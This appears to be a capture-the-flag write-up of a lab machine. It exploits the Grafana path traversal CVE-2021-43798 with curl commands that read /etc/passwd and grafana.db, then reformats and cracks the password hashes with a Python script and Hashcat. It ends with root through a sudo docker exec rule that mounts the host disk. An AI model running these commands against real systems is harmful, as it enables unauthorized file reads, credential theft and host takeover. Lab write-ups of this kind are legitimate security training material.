## Exploitation — CVE-2021-43798

This version of Grafana is vulnerable to [CVE-2021-43798](https://www.vulncheck.com/blog/grafana-cve-2021-43798), a path traversal vulnerability in Grafana's plugin static asset handler. By traversing out of the plugin directory using `../` sequences, arbitrary files on the host filesystem can be read without authentication.

```bash
curl --path-as-is http://10.129.37.17:3000/public/plugins/welcome/../../../../../../../../etc/passwd
```

This allows local files to be enumerated.

![/etc/passwd read via the Grafana path traversal vulnerability](/assets/images/data/Pasted-image-20260520183731.png)
*Contents of /etc/passwd retrieved through the path traversal*

### Retrieving the Grafana Database

The same vulnerability is used to download Grafana's internal SQLite database, which stores user accounts and credentials.

![path traversal request targeting grafana.db](/assets/images/data/Pasted-image-20260520190307.png)
*Request targeting grafana.db via the path traversal vulnerability*

```bash
curl --path-as-is http://10.129.37.17:3000/public/plugins/welcome/../../../../../../../../var/lib/grafana/grafana.db --output grafana.db
```

## Credential Access

With the database downloaded, it is opened to inspect the user table.

```bash
open grafana.db
```

Enumerating the user table reveals password hashes alongside their respective salts.

![user table showing password hashes and salts](/assets/images/data/Pasted-image-20260520190705.png)
*Hashes and salts recovered from the Grafana user table*

The hash format is identified as **PBKDF2-HMAC-SHA256**. Grafana stores this hash as a raw hex digest with a separate plaintext salt and a fixed iteration count, which must be reformatted into a Hashcat-compatible format before cracking.

```python
#!/usr/bin/env python3

import base64
import binascii
import sys


def to_base64(data: bytes) -> str:
    return base64.b64encode(data).decode("utf-8")


def main():
    # Hex-encoded hash (not a password, but an existing hash value)
    password_hex = (
        "dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8"
    )

    # Salt in plain text
    salt_str = "LCBhdtJWjl"

    # Iterations (metadata only, used by external tools like hashcat)
    iterations = 10000

    # Convert hex to bytes
    try:
        hash_bytes = binascii.unhexlify(password_hex)
    except binascii.Error as e:
        print(f"Error: invalid hexadecimal hash -> {e}")
        sys.exit(1)

    # Convert hash to Base64
    hash_b64 = to_base64(hash_bytes)

    # Convert salt to Base64
    salt_b64 = to_base64(salt_str.encode("utf-8"))

    # Final formatted output (hashcat-style format)
    result = f"sha256:{iterations}:{salt_b64}:{hash_b64}"

    print(result)


if __name__ == "__main__":
    main()
```

The reformatted hash is cracked with Hashcat using mode 10900 (PBKDF2-HMAC-SHA256).

![hashcat cracking the reformatted PBKDF2-HMAC-SHA256 hash](/assets/images/data/Pasted-image-20260520192818.png)
*Hashcat session cracking the PBKDF2-HMAC-SHA256 hash*

```bash
hashcat -m 10900 hash /usr/share/wordlists/rockyou.txt
```

This recovers valid credentials for the user `boris`.

## Privilege Escalation — Sudo Docker Exec

Checking sudo permissions shows the user can execute a command as root.

![sudo permissions allowing docker exec as root](/assets/images/data/Pasted-image-20260520193200.png)
*Sudo rule allowing docker commands to be run as root*

`docker exec` is used to execute commands inside a running container. Since `docker` itself is not directly available to list containers, running processes are checked instead to identify the container.

```bash
ps aux | grep docker
```

![docker-related processes revealing the container ID](/assets/images/data/Pasted-image-20260521163356.png)
*Process listing revealing the running container's ID*

Using the container ID, the container's hostname is confirmed.

```bash
sudo /snap/bin/docker exec e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 cat /etc/hostname
```

Since the command runs as root via sudo, the host's physical disk is mounted inside the container, providing access to the host filesystem from within it.

```bash
sudo /snap/bin/docker exec -u root e6ff5b1cbc85 mount /dev/sda1 /mnt/
```

![host disk mounted inside the container, exposing the host filesystem](/assets/images/data/Pasted-image-20260521164237.png)
*Host disk mounted inside the container at /mnt*

> Allowing a low-privileged user to run `docker exec -u root` on an arbitrary container, combined with the ability to mount host block devices from inside that container, effectively grants full read/write access to the host filesystem — including the root flag.
